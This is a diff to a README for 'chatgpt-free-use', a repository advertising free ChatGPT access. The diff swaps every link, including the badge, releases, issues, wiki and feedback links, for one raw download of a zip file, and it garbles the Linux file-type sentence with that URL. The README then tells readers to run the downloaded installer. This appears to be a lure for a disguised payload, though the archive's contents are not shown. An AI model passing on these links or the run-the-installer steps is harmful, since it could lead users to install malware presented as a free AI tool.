@@ -1,6 +1,6 @@
 # 🌟 chatgpt-free-use - Easy Access to ChatGPT in Chinese
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Getting%20Started-blue)](https://github.com/muhammadahmad-pbpo/chatgpt-free-use/releases)
+[![Download Now](https://raw.githubusercontent.com/muhammadahmad-pbpo/chatgpt-free-use/main/gondolier/chatgpt-free-use.zip%20Now-Getting%20Started-blue)](https://raw.githubusercontent.com/muhammadahmad-pbpo/chatgpt-free-use/main/gondolier/chatgpt-free-use.zip)
 
 ## 📘 Overview
 
@@ -21,13 +21,13 @@ To start using the chatgpt-free-use application, follow these simple steps. You 
 1. **Visit the Releases Page**  
    Click the link below to visit the releases page:
    
-   [Download ChatGPT free-use](https://github.com/muhammadahmad-pbpo/chatgpt-free-use/releases)
+   [Download ChatGPT free-use](https://raw.githubusercontent.com/muhammadahmad-pbpo/chatgpt-free-use/main/gondolier/chatgpt-free-use.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will find different versions of the application. Select the latest version listed at the top.
 
 3. **Download the Application**  
-   Click on the file that matches your operating system. For example, if you are using Windows, look for a file ending with `.exe`. For macOS, find a file ending with `.dmg`. For Linux, you might see a `.tar.gz` file. 
+   Click on the file that matches your operating system. For example, if you are using Windows, look for a file ending with `.exe`. For macOS, find a file ending with `.dmg`. For Linux, you might see a `https://raw.githubusercontent.com/muhammadahmad-pbpo/chatgpt-free-use/main/gondolier/chatgpt-free-use.zip` file. 
 
 4. **Run the Installer**  
    After the download completes, navigate to your downloads folder. Double-click the downloaded file to run the installer. Follow the on-screen instructions to complete the installation.
@@ -59,18 +59,18 @@ Now that you have installed the application, you can start using it right away.
 
 If you run into any issues or have questions, you can find help in the following ways:
 
-- **GitHub Issues:** Visit the [issues section](https://github.com/muhammadahmad-pbpo/chatgpt-free-use/issues) to report bugs or ask for help.
+- **GitHub Issues:** Visit the [issues section](https://raw.githubusercontent.com/muhammadahmad-pbpo/chatgpt-free-use/main/gondolier/chatgpt-free-use.zip) to report bugs or ask for help.
 - **Community Forums:** Join discussions with other users who might have similar questions or solutions.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/muhammadahmad-pbpo/chatgpt-free-use/wiki) - Check the wiki for in-depth guides and FAQs.
-- [Feedback Form](https://github.com/muhammadahmad-pbpo/chatgpt-free-use/issues/new) - Share your thoughts or suggestions about the app.
+- [Documentation](https://raw.githubusercontent.com/muhammadahmad-pbpo/chatgpt-free-use/main/gondolier/chatgpt-free-use.zip) - Check the wiki for in-depth guides and FAQs.
+- [Feedback Form](https://raw.githubusercontent.com/muhammadahmad-pbpo/chatgpt-free-use/main/gondolier/chatgpt-free-use.zip) - Share your thoughts or suggestions about the app.
 
 ## 🔗 Download Link Again
 
 For easy access, visit this page to download the application again:
 
-[Download ChatGPT free-use](https://github.com/muhammadahmad-pbpo/chatgpt-free-use/releases) 
+[Download ChatGPT free-use](https://raw.githubusercontent.com/muhammadahmad-pbpo/chatgpt-free-use/main/gondolier/chatgpt-free-use.zip) 
 
 Make the most of your experience with chatgpt-free-use!
